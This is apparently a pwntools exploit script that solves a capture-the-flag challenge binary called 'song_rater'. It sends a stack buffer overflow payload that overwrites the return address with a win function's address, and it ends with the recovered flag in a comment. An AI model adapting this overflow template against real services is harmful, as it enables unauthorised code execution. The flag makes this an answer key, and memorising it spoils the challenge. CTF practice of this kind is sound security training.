#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./song_rater')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./song_rater', gdbscript=gs)
    if args.REMOTE:
        return remote('mamacita--ozuna-7570.ctf.kitctf.de', 443, ssl=True)
    else:
        return process('./song_rater')
r = start()
#========= exploit here ===================
payload = b"A"*0x100
payload += b"B"*8
payload += p64(elf.sym.scratched_record)

r.sendlineafter(b"Please enter your song:", payload)

#========= interactive ====================
r.interactive()
#GPNCTF{G00d_n3w5!_1t_l00ks_l1ke_y0u_r3p41r3d_y0ur_disk...}
